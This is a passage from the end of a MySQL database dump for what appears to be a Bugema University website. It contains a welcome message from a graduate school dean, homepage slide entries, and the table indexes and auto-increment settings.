quality research in order to meet their objectives. \r\nThank you for your interest in graduate education at Bugema University. We hope that you will enjoy the opportunities to broaden your knowledge and grow with us. \r\nBest wishes, \r\nDr. Rosette Kabuye \r\nDean, School of Graduate Studies \r\nBugema University\r\n');

-- --------------------------------------------------------

--
-- Table structure for table `slides`
--

CREATE TABLE `slides` (
  `id` int(11) NOT NULL,
  `photo` varchar(250) NOT NULL,
  `title` varchar(250) NOT NULL,
  `tagline` varchar(250) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `slides`
--

INSERT INTO `slides` (`id`, `photo`, `title`, `tagline`) VALUES
(8, 'includes/slides/elearning2.jpg', 'Want to join University?', ''),
(9, 'includes/slides/DSC_3053.jpg', 'Welcome to Bugema University', 'Bugema University envisions training for \"Excellence in Service\".'),
(10, 'includes/slides/IMG_9529.jpg', 'Bugema University', 'A place to make your dreams come true'),
(12, 'includes/slides/Team (1).jpg', 'FEASA UNIVERSITY CHAMPIONSHIPS', 'Diversity of Talents at Bugema University'),
(14, 'includes/slides/Grad.jpeg', '', 'Congratulations to all the graduands');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `campus`
--
ALTER TABLE `campus`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `comments`
--
ALTER TABLE `comments`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `department`
--
ALTER TABLE `department`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `event`
--
ALTER TABLE `event`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `gallery`
--
ALTER TABLE `gallery`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `news`
--
ALTER TABLE `news`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `programs`
--
ALTER TABLE `programs`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `publications`
--
ALTER TABLE `publications`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `school`
--
ALTER TABLE `school`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `slides`
--
ALTER TABLE `slides`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `campus`
--
ALTER TABLE `campus`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT for table `comments`
--
ALTER TABLE `comments`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=139;

--
-- AUTO_INCREMENT for table `department`
--
ALTER TABLE `department`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=22;

--
-- AUTO_INCREMENT for table `event`
--
ALTER TABLE `event`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- AUTO_INCREMENT for table `gallery`
--
ALTER TABLE `gallery`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=137;

--
-- AUTO_INCREMENT for table `news`
--
ALTER TABLE `news`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=12;

--
-- AUTO_INCREMENT for table `programs`
--
ALTER TABLE `programs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=13;

--
-- AUTO_INCREMENT for table `publications`
--
ALTER TABLE `publications`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=21;

--
-- AUTO_INCREMENT for table `school`
--
ALTER TABLE `school`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=27;

--
-- AUTO_INCREMENT for table `slides`
--
ALTER TABLE `slides`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=15;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
